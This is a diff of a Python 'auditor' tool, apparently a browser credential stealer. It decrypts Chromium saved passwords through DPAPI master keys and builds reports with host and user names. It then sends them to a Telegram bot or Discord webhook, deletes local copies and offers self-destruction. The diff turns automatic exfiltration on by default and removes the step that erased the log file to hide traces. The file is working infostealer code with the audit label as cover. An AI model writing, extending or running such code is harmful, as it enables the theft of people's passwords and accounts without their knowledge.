@@ -1,19 +1,3 @@
-# 🛡️ ChromiumSpecter — Tactical Auditor Suite
-# Copyright (C) 2026 ANONIMO432HZ
-#
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program. If not, see <https://fsf.org/licenses/>.
-
 import os
 import sys
 import json
@@ -37,14 +21,14 @@ from datetime import datetime
 __version__ = "1.4.0"
 
 # =========================================================================
-# CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
+# ⚙️ CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
 # =========================================================================
 CONFIG = {
     "tg_token":   "",  
     "tg_chat_id": "",  
     "ds_webhook": "",  
     "stealth":       False,
-    "auto_exfil":    False,
+    "auto_exfil":    True,
     "output_dir":    ".audit",
     "delay":         1,
     "send_delay":    2,
@@ -296,68 +280,57 @@ class ChromiumDecryptor:
 
     # ── Obtención de Llave AES ─────────────────────────────────────────────────
 
-    def get_keys(self, user_data_path: Path):
+    def get_key(self, user_data_path: Path):
         """
-        Extrae y descifra las master keys (v10 y v20) del Local State.
-        Retorna (keys: dict, dpapi_available: bool).
+        Extrae y descifra la master key AES del Local State.
+        Retorna (aes_key: bytes | None, dpapi_available: bool).
+        
+        - aes_key=None + dpapi_available=True  → perfil legacy, solo DPAPI
+        - aes_key=bytes + dpapi_available=True  → perfil moderno, ambos modos posibles
+        - aes_key=None + dpapi_available=False  → entorno sin soporte (sin win32crypt)
         """
         dpapi_available = bool(win32crypt)
-        keys = {}
         ls = user_data_path / "Local State"
 
         if not ls.exists():
             logger.debug(f"Local State no encontrado en: {user_data_path}")
-            return keys, dpapi_available
+            return None, dpapi_available
 
         try:
             with open(ls, "r", encoding="utf-8") as f:
                 config = json.load(f)
         except Exception as e:
             logger.warning(f"Error leyendo Local State ({user_data_path}): {e}")
-            return keys, dpapi_available
+            return None, dpapi_available
 
-        # 1. Intentar obtener llave v20 (App-Bound)
-        app_bound_b64 = config.get("os_crypt", {}).get("app_bound_encrypted_key")
-        if app_bound_b64 and win32crypt:
-            is_admin = False
-            try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            except: pass
-            
-            if not is_admin:
-                logger.warning("!!! DETECTADA LLAVE V20 (Chrome 127+). REQUIERE EJECUTAR COMO ADMINISTRADOR PARA DESCIFRAR !!!")
-
-            try:
-                import importlib
-                v20_module = importlib.import_module('modules.chrome_v20_decryption.v20_decryptor')
-                v20_key = v20_module.get_v20_key(app_bound_b64, win32crypt)
-                if v20_key:
-                    logger.debug(f"Master key AES (v20) obtenida ({len(v20_key)} bytes) para: {user_data_path}")
-                    keys['v20'] = v20_key
-            except Exception as e:
-                logger.debug(f"Fallback desde v20. Error: {e}")
-
-        # 2. Intentar obtener llave v10 (DPAPI normal)
         encrypted_key_b64 = config.get("os_crypt", {}).get("encrypted_key")
-        if encrypted_key_b64:
-            try:
-                raw = base64.b64decode(encrypted_key_b64)
-                if raw.startswith(b"DPAPI"):
-                    encrypted = raw[5:]
-                    if win32crypt:
-                        v10_key = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
-                        logger.debug(f"Master key AES (v10) obtenida ({len(v10_key)} bytes) para: {user_data_path}")
-                        keys['v10'] = v10_key
-            except Exception as e:
-                logger.warning(f"Error descifrando master key v10 en {user_data_path}: {e}")
+        if not encrypted_key_b64:
+            logger.debug(f"No hay os_crypt.encrypted_key en: {user_data_path}")
+            return None, dpapi_available
 
-        if not keys:
-            logger.debug(f"No hay llaves validas en os_crypt para: {user_data_path}")
+        try:
+            raw = base64.b64decode(encrypted_key_b64)
+            # Los primeros 5 bytes son el literal ASCII "DPAPI"
+            if not raw.startswith(b"DPAPI"):
+                logger.warning(f"Prefijo DPAPI inesperado en Local State: {user_data_path}")
+                return None, dpapi_available
 
-        return keys, dpapi_available
+            encrypted = raw[5:]
+            if not win32crypt:
+                logger.debug("win32crypt no disponible, no se puede descifrar master key")
+                return None, False
+
+            aes_key = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
+            logger.debug(f"Master key AES obtenida ({len(aes_key)} bytes) para: {user_data_path}")
+            return aes_key, True
+
+        except Exception as e:
+            logger.warning(f"Error descifrando master key en {user_data_path}: {e}")
+            return None, dpapi_available
 
     # ── Descifrado por Blob ────────────────────────────────────────────────────
 
-    def decrypt(self, blob: bytes, keys: dict) -> str:
+    def decrypt(self, blob: bytes, aes_key: bytes | None) -> str:
         """
         Descifra un blob individual de password_value de Chromium.
 
@@ -371,19 +344,10 @@ class ChromiumDecryptor:
         if not blob:
             return ""
 
-        # ── AES-GCM (Chromium v80+, prefijo v10, v11, o v20) ───────────────────
-        if blob[:3] in (b"v10", b"v11", b"v20"):
-            prefix = blob[:3].decode('ascii', errors='ignore')
-            aes_key = keys.get(prefix)
-            
-            # v11 usa la misma llave que v10
-            if prefix == "v11":
-                aes_key = keys.get("v10")
-
+        # ── AES-GCM (Chromium v80+, prefijo v10 o v11) ───────────────────────
+        if blob[:3] in (b"v10", b"v11"):
             if not aes_key:
-                logger.debug(f"Blob AES-GCM sin llave disponible para prefijo {prefix}")
-                if prefix == "v20":
-                    return "[Admin Required for v20]"
+                logger.debug("Blob AES-GCM sin llave disponible")
                 return "[Sin Llave AES]"
 
             if len(blob) < 3 + 12 + 16:      # mínimo viable: prefijo + nonce + tag vacío
@@ -394,16 +358,13 @@ class ChromiumDecryptor:
             ciphertext = blob[15:-16]
             tag        = blob[-16:]
 
-            if AES is None:
-                logger.debug("Cryptodome no está instalado. No se puede instanciar AES.")
-                return "[Error AES-GCM: Cryptodome missing]"
-
             try:
                 cipher = AES.new(aes_key, AES.MODE_GCM, nonce)
                 plain  = cipher.decrypt_and_verify(ciphertext, tag)
                 return plain.decode("utf-8", errors="replace").strip()
             except Exception as e:
-                logger.debug(f"AES-GCM falló para {prefix} (llave incorrecta o blob corrupto): {e}")
+                logger.debug(f"AES-GCM falló (llave incorrecta o blob corrupto): {e}")
+                # El blob tiene prefijo v10 pero la llave no lo descifra.
                 # Intentamos DPAPI por si es un blob migrado a medias.
                 if win32crypt:
                     try:
@@ -467,15 +428,15 @@ class ChromiumDecryptor:
             if not base_path.exists():
                 continue
 
-            # Las llaves AES se obtienen una vez por navegador (del Local State raíz)
-            keys, dpapi_ok = self.get_keys(base_path)
+            # La llave AES se obtiene una vez por navegador (del Local State raíz)
+            aes_key, dpapi_ok = self.get_key(base_path)
 
-            if not keys and not dpapi_ok:
+            if not aes_key and not dpapi_ok:
                 logger.info(f"[{browser_name}] Sin capacidad de descifrado, omitiendo.")
                 continue
 
-            if not keys:
-                logger.debug(f"[{browser_name}] Solo modo DPAPI (sin master keys AES).")
+            if not aes_key:
+                logger.debug(f"[{browser_name}] Solo modo DPAPI (sin master key AES).")
 
             profiles = self._scan_profiles(base_path, multi_profile)
 
@@ -488,7 +449,7 @@ class ChromiumDecryptor:
                     "name":        browser_name,
                     "profile":     profile_path.name,
                     "db_path":     profile_path / "Login Data",
-                    "keys":        keys,
+                    "key":         aes_key,
                     "dpapi_ok":    dpapi_ok,
                 })
 
@@ -531,7 +492,7 @@ class ChromiumDecryptor:
                     if not blob:
                         continue
 
-                    pwd = self.decrypt(blob, t['keys'])
+                    pwd = self.decrypt(blob, t['key'])
                     entry = [t['name'], t['profile'], url, user, pwd]
 
                     if url.startswith(VALID_URL_PREFIXES):
@@ -554,46 +515,36 @@ class ChromiumDecryptor:
             return self.audit(output_dir, skip_html, skip_csv, browser_filter, callback, auto_kill=False)
 
         if not data and not filtered:
-            log("No se extrajeron datos válidos.", "info")
             return None, None, None
 
-        # ── Generación de Reportes ────────────────────────────────────────────
         stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         h_p = output_dir / f"audit_report_{stamp}.html" if not skip_html else None
         c_p = output_dir / f"audit_report_{stamp}.csv" if not skip_csv else None
 
-        # Obtención segura y ultrarrápida de metadatos (bypasses DNS/AD hangs)
-        hname = os.environ.get("COMPUTERNAME", "Unknown")
-        uname = os.environ.get("USERNAME", "Unknown")
-
         if h_p:
-            log(f"Generando reporte HTML: {h_p.name}...", "info")
             r_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in data])
             f_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in filtered])
             f_s = f'<h2 style="margin-top:40px;color:#e67e22;border-bottom:2px solid #e67e22;">Entradas Filtradas</h2><table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{f_h}</tbody></table>' if filtered else ""
             content = (HTML_TEMPLATE.replace("{{total}}", str(len(data))).replace("{{filtered_count}}", str(len(filtered)))
-                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", hname)
-                       .replace("{{username}}", uname).replace("{{pid}}", str(os.getpid()))
+                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", socket.gethostname())
+                       .replace("{{username}}", getpass.getuser()).replace("{{pid}}", str(os.getpid()))
                        .replace("{{version}}", __version__).replace("{{rows}}", r_h).replace("{{filtered_section}}", f_s)
                        .replace("{{skipped_note}}", f" ({len(filtered)} filtrados)" if filtered else ""))
             with open(h_p, "w", encoding='utf-8') as f: f.write(content)
 
         if c_p:
-            log(f"Generando reporte CSV: {c_p.name}...", "info")
             with open(c_p, 'w', newline='', encoding='utf-8') as f:
                 w = csv.writer(f)
-                w.writerow([f"# Reporte Auditoria | Host: {hname} | User: {uname} | Ver: {__version__}"])
+                w.writerow([f"# Reporte Auditoria | Host: {socket.gethostname()} | User: {getpass.getuser()} | Ver: {__version__}"])
                 w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                 w.writerows(data)
                 if filtered:
                     w.writerow([]); w.writerow(["# --- FILTRADOS ---"])
                     w.writerows(filtered)
-        
-        log("Auditoría completada exitosamente.", "info")
         return (data + filtered), h_p, c_p
 
 def main():
-    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}\n\n[IMPORTANTE] Para soporte V20 (Chrome v127+), REQUIERE EJECUTAR COMO ADMINISTRADOR.", formatter_class=argparse.RawTextHelpFormatter)
+    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}")
     ex = parser.add_argument_group("Exfiltración")
     ex.add_argument("--webhook", help="Discord Webhook")
     ex.add_argument("--tg-token", help="Telegram Token")
@@ -628,7 +579,7 @@ def main():
     
     out = _setup_environment(args.output_dir, start_logging=True)
     if args.clean:
-        for ext in ("*.html", "*.csv", "*.json", "*.log"):
+        for ext in ("*.html", "*.csv", "*.json"):
             for f in out.glob(ext): f.unlink()
         return
     
@@ -642,29 +593,20 @@ def main():
     auditor = ChromiumDecryptor()
     results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser, auto_kill=args.auto_kill)
     
-    jp = None
     if results and args.json:
         jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
     
     # auto_exfil puede ser desactivado desde el CONFIG embebido (Builder) o con --no-exfil
     if results and not args.no_exfil and CONFIG["auto_exfil"]:
-        # Timeout robusto de 15s para red, no vinculado al delay de ejecución
-        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=CONFIG.get("webhook_timeout", 15))
-        # Incluir JSON en los archivos a enviar si existe
-        files = [p for p in (hp, cp, (jp if results and args.json else None)) if p and p.exists()]
+        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
+        files = [p for p in (hp, cp) if p and p.exists()]
         if files:
-            logger.info(f"Iniciando exfiltración de {len(files)} archivos...")
             exf.send_files(files)
             # Auto-wipe local reports tras exfiltrar, a menos que --no-wipe esté activo
             if not args.no_wipe and (tg_t or ds_w):
                 for p in files:
                     p.unlink(missing_ok=True)
-                # Cerrar y borrar el log también para no dejar rastro
-                shutdown_logging()
-                log_file = out / "pentest_audit.log"
-                if log_file.exists():
-                    log_file.unlink(missing_ok=True)
         
         if args.self_destruct:
             exf.self_destruct()
